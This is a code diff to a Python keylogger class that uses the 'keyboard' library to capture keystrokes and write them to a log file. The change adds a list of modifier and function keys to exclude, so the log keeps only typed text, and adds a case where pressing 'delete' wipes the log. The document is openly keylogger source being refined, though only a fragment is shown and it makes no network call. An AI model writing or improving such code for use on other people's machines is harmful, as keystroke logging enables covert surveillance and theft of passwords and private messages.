@@ -1,4 +1,7 @@
 import keyboard
+dont_write = ["ctrl", "right ctrl", "shift", "right shift", "esc", "alt", "right windows", "right alt", "menu"
+              , "left", "right", "up", "down", "caps lock", "tab", "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8",
+             "f9", "f10", "f11", "f12", "insert", "page down", "page up", "end", "print screen", "scroll lock", "pause"]
 
 class KeyLogger():
     def __init__(self, filename):
@@ -8,12 +11,15 @@ class KeyLogger():
     
     def ReadKey(self, key):
         print_key = key.name
-        if print_key in ["ctrl", "right ctrl", "shift", "right shift", "esc"]:
+        if print_key in dont_write:
             print_key = ""
         match print_key:
+            case "delete":
+                self.log_file.seek(0)
+                self.log_file.truncate()
             case "space": 
                 print_key = " "
-            case "enter": 
+            case "enter":
                 print_key = "\n"
             case "backspace":
                 self.log_file.seek(0)
